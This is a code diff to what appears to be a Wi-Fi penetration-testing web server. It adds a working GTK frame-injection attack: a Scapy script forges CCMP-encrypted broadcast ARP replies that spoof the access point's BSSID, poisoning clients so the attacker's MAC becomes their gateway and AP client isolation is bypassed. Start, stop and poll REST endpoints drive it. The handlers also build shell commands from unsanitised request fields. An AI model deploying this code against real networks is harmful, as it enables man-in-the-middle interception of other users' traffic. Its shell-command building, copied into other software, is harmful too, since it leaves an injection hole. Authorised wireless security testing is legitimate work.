@@ -63,6 +63,10 @@ _pcap_start_time: float = 0.0
 _cred_proc: subprocess.Popen | None = None
 _cred_lines: list[str] = []
 
+# GTK frame injection state (bypasses AP client isolation via 802.11 monitor-mode injection)
+_gtk_inject_proc: subprocess.Popen | None = None
+_gtk_inject_job: dict = {"status": "idle"}   # idle | running | stopped | error
+
 # WPA2 handshake capture state
 _hs_job: dict = {"status": "idle"}   # idle | running | captured | done | error
 _hs_proc: subprocess.Popen | None = None
@@ -1875,6 +1879,217 @@ async def api_mitm_stop(request):
     })
 
 
+# ── GTK Frame Injection ───────────────────────────────────────────────────────
+#
+# Forges broadcast ARP replies encrypted with the shared GTK and injects them
+# at the 802.11 layer in monitor mode.  Because we spoof addr2=BSSID and encrypt
+# with the real GTK, clients accept the frame as a legitimate AP broadcast — even
+# when the AP enforces client isolation on unicast/normal-broadcast paths.
+#
+# Script runs under the airsnitch venv (scapy + pycryptodome live there).
+# ─────────────────────────────────────────────────────────────────────────────
+
+_GTK_INJECT_SCRIPT = r'''
+import sys, struct, time, os
+from scapy.all import RadioTap, Raw, sendp, conf as scapy_conf
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    import subprocess, sys as _sys
+    subprocess.check_call([_sys.executable, "-m", "pip", "install", "pycryptodome", "-q"])
+    from Crypto.Cipher import AES
+
+scapy_conf.verb = 0
+
+def build_gtk_arp_frame(gtk_bytes, bssid_bytes, our_mac_bytes, gw_ip_bytes, pn):
+    """CCMP-encrypted 802.11 from-DS broadcast ARP reply claiming gateway->our_mac."""
+    # MSDU: LLC/SNAP (EtherType 0x0806=ARP) + ARP Reply payload
+    llc_snap = bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06])
+    arp = (b'\x00\x01'                      # HW type: Ethernet
+           b'\x08\x00'                      # Proto: IPv4
+           b'\x06'                          # HW size
+           b'\x04'                          # Proto size
+           b'\x00\x02'                      # Opcode: Reply
+           + our_mac_bytes                  # Sender MAC  (us = "gateway")
+           + gw_ip_bytes                    # Sender IP   (gateway IP)
+           + b'\xff\xff\xff\xff\xff\xff'    # Target MAC  (broadcast)
+           + b'\x00\x00\x00\x00')           # Target IP   (don't care)
+    plaintext = llc_snap + arp
+
+    # 802.11 QoS Data header: from-DS=1, protected=1 → FC=0x8842
+    fc = 0x8842
+    addr1 = b'\xff\xff\xff\xff\xff\xff'  # Destination: broadcast
+    addr2 = bssid_bytes                  # Transmitter:  AP BSSID (spoofed)
+    addr3 = our_mac_bytes                # Source:       us
+    sc    = struct.pack('<H', (pn & 0xFFF) << 4)
+    qos   = struct.pack('<H', 0x0000)
+    mpdu  = struct.pack('<H', fc) + struct.pack('<H', 0) + addr1 + addr2 + addr3 + sc + qos
+
+    # CCMP header: PN0..PN1 | 0 | ExtIV+KeyID | PN2..PN5
+    pn_b = pn.to_bytes(6, 'big')          # pn_b[0]=PN5(MSB) … pn_b[5]=PN0(LSB)
+    ccmp_hdr = bytes([pn_b[5], pn_b[4], 0x00, 0x20,
+                      pn_b[3], pn_b[2], pn_b[1], pn_b[0]])
+
+    # CCMP Nonce (13 bytes): priority(1) || A2=BSSID(6) || PN-big-endian(6)
+    nonce = bytes([0]) + addr2 + pn_b
+
+    # CCMP AAD: masked-FC(2) || A1(6) || A2(6) || A3(6) || masked-SC(2) || masked-QoS(2)
+    fc_masked = fc & ~(0x0800 | 0x1000 | 0x2000)   # clear retry, pwr_mgmt, more_data
+    aad = (struct.pack('<H', fc_masked & 0xFFFF)
+           + addr1 + addr2 + addr3
+           + struct.pack('<H', 0)    # SC masked
+           + struct.pack('<H', 0))   # QoS masked (TID=0)
+
+    cipher = AES.new(gtk_bytes, AES.MODE_CCM, nonce=nonce, mac_len=8,
+                     msg_len=len(plaintext))
+    cipher.update(aad)
+    ciphertext, mic = cipher.encrypt_and_digest(plaintext)
+
+    return mpdu + ccmp_hdr + ciphertext + mic
+
+gtk_hex   = sys.argv[1]
+bssid_s   = sys.argv[2]
+our_mac_s = sys.argv[3]
+gw_ip_s   = sys.argv[4]
+mon_iface = sys.argv[5]
+interval  = float(sys.argv[6])
+burst     = int(sys.argv[7])
+
+gtk_bytes     = bytes.fromhex(gtk_hex)
+bssid_bytes   = bytes.fromhex(bssid_s.replace(':', '').replace('-', ''))
+our_mac_bytes = bytes.fromhex(our_mac_s.replace(':', '').replace('-', ''))
+gw_ip_bytes   = bytes(int(x) for x in gw_ip_s.split('.'))
+
+pn = 0x0200   # start PN above 0 to avoid immediate replay drop
+injected = 0
+
+print(f"[gtk-inject] Starting on {mon_iface} | BSSID={bssid_s} | GTK={gtk_hex[:8]}...", flush=True)
+print(f"[gtk-inject] Gateway={gw_ip_s} | Our MAC={our_mac_s} | burst={burst} every {interval}s", flush=True)
+
+while True:
+    for _ in range(burst):
+        try:
+            frame_bytes = build_gtk_arp_frame(gtk_bytes, bssid_bytes, our_mac_bytes, gw_ip_bytes, pn)
+            rt = RadioTap() / Raw(load=frame_bytes)
+            sendp(rt, iface=mon_iface, count=1, verbose=0)
+            pn += 1
+            injected += 1
+        except Exception as e:
+            print(f"[gtk-inject] Frame error: {e}", flush=True)
+    print(f"[gtk-inject] Injected {injected} frames total (PN={hex(pn)})", flush=True)
+    time.sleep(interval)
+'''
+
+_GTK_INJECT_SCRIPT_PATH = "/tmp/airsnitch_gtk_inject.py"
+
+
+async def api_gtk_inject_start(request):
+    """Start continuous GTK frame injection in monitor mode to bypass AP client isolation."""
+    global _gtk_inject_proc, _gtk_inject_job
+    body = await request.json()
+    iface   = body.get("iface", "wlan0").strip()
+    if iface.endswith("mon"):
+        iface = iface[:-3]
+    bssid      = body.get("bssid", "").strip()
+    gtk_hex    = body.get("gtk", "").strip()
+    gateway_ip = body.get("gateway_ip", "").strip()
+    our_mac    = body.get("our_mac", "").strip()
+    interval   = float(body.get("interval", 10))
+    burst      = int(body.get("burst", 30))
+
+    if not bssid:
+        return web.json_response({"error": "bssid required"}, status=400)
+    if not gtk_hex or len(gtk_hex) != 32:
+        return web.json_response({"error": "gtk must be 32 hex chars (16 bytes)"}, status=400)
+    if not gateway_ip:
+        return web.json_response({"error": "gateway_ip required"}, status=400)
+
+    # Get our MAC if not provided
+    if not our_mac:
+        _, mac_out = run(f"cat /sys/class/net/{iface}/address 2>/dev/null", timeout=3)
+        our_mac = mac_out.strip() or "00:13:37:00:00:01"
+
+    # Kill any existing injection
+    if _gtk_inject_proc and _gtk_inject_proc.poll() is None:
+        _gtk_inject_proc.terminate()
+        try: _gtk_inject_proc.wait(timeout=3)
+        except subprocess.TimeoutExpired: _gtk_inject_proc.kill()
+
+    # Put interface into monitor mode
+    rc_mon, out_mon = await async_run(f"airmon-ng start {iface} 2>&1", timeout=20)
+    mon_iface = f"{iface}mon"
+    # Verify monitor iface exists
+    _, mon_check = run(f"iw dev {mon_iface} info 2>/dev/null", timeout=3)
+    if "type monitor" not in mon_check:
+        return web.json_response({"error": f"Failed to create {mon_iface}: {out_mon}"}, status=500)
+
+    # Write injection script
+    with open(_GTK_INJECT_SCRIPT_PATH, "w") as f:
+        f.write(_GTK_INJECT_SCRIPT)
+
+    # Launch under airsnitch venv (has scapy + pycryptodome)
+    python = os.path.join(AIRSNITCH_DIR, "venv", "bin", "python3")
+    cmd = [python, _GTK_INJECT_SCRIPT_PATH,
+           gtk_hex, bssid, our_mac, gateway_ip, mon_iface,
+           str(interval), str(burst)]
+    _gtk_inject_proc = subprocess.Popen(
+        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+    _gtk_inject_job = {
+        "status": "running", "iface": iface, "mon_iface": mon_iface,
+        "bssid": bssid, "gtk": gtk_hex, "gateway_ip": gateway_ip,
+        "our_mac": our_mac, "burst": burst, "interval": interval,
+        "lines": [],
+    }
+    # Background reader thread
+    def _read_output():
+        for line in iter(_gtk_inject_proc.stdout.readline, ""):
+            line = line.rstrip()
+            _gtk_inject_job["lines"].append(line)
+            if len(_gtk_inject_job["lines"]) > 200:
+                _gtk_inject_job["lines"] = _gtk_inject_job["lines"][-200:]
+        _gtk_inject_job["status"] = "stopped"
+    t = threading.Thread(target=_read_output, daemon=True)
+    t.start()
+
+    append_log(f"[gtk-inject] Started on {mon_iface} | GTK={gtk_hex[:8]}... | {burst} frames every {interval}s")
+    return web.json_response({"started": True, "mon_iface": mon_iface,
+                               "our_mac": our_mac, "bssid": bssid})
+
+
+async def api_gtk_inject_stop(request):
+    """Stop GTK injection and restore interface to managed mode."""
+    global _gtk_inject_proc, _gtk_inject_job
+    mon_iface = _gtk_inject_job.get("mon_iface", "")
+    iface     = _gtk_inject_job.get("iface", "wlan0")
+
+    if _gtk_inject_proc and _gtk_inject_proc.poll() is None:
+        _gtk_inject_proc.terminate()
+        try: _gtk_inject_proc.wait(timeout=5)
+        except subprocess.TimeoutExpired: _gtk_inject_proc.kill()
+
+    _gtk_inject_job["status"] = "stopped"
+
+    # Restore managed mode
+    rc, out = await async_run(f"airmon-ng stop {mon_iface} 2>&1", timeout=15)
+    append_log(f"[gtk-inject] Stopped. Interface {mon_iface} → managed.")
+    return web.json_response({"stopped": True, "restore_output": out,
+                               "lines": _gtk_inject_job.get("lines", [])})
+
+
+async def api_gtk_inject_poll(request):
+    """Poll GTK injection status and recent output lines."""
+    running = bool(_gtk_inject_proc and _gtk_inject_proc.poll() is None)
+    return web.json_response({
+        "status":  _gtk_inject_job.get("status", "idle"),
+        "running": running,
+        "lines":   _gtk_inject_job.get("lines", [])[-20:],
+        "bssid":   _gtk_inject_job.get("bssid", ""),
+        "our_mac": _gtk_inject_job.get("our_mac", ""),
+    })
+
+
 # ── REST API: Recon ──────────────────────────────────────────────────────────
 
 async def api_recon_scan_aps(request):
@@ -2458,6 +2673,11 @@ def create_app():
     # AirSnitch GTK Check (single NIC — calls airsnitch-run)
     app.router.add_post("/api/airsnitch/gtk-check", api_gtk_check)
     app.router.add_get("/api/airsnitch/gtk-poll", api_gtk_poll)
+
+    # GTK Frame Injection
+    app.router.add_post("/api/pentest/gtk-inject-start", api_gtk_inject_start)
+    app.router.add_post("/api/pentest/gtk-inject-stop",  api_gtk_inject_stop)
+    app.router.add_get("/api/pentest/gtk-inject-poll",   api_gtk_inject_poll)
 
     # Recon
     app.router.add_post("/api/recon/scan-aps", api_recon_scan_aps)
